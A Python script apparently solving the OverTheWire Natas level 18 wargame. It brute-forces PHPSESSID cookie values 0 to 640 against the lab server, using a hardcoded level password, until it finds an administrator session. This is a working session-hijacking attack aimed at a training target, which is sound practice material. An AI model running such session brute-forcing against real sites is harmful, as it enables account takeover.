import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas18.natas.labs.overthewire.org/index.php'
auth = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

def send_request(id):
    cookie = { 'PHPSESSID': str(id) }
    req = requests.post(url, cookies=cookie, auth=auth)
    if 'in as an admin to retrieve credentials for natas19.' in req.text:
        return False
    else:
        print(req.text)
        return True

for i in range(0, 641):
    print(f'\r{i}', flush=False, end=' ')
    if send_request(i):
        break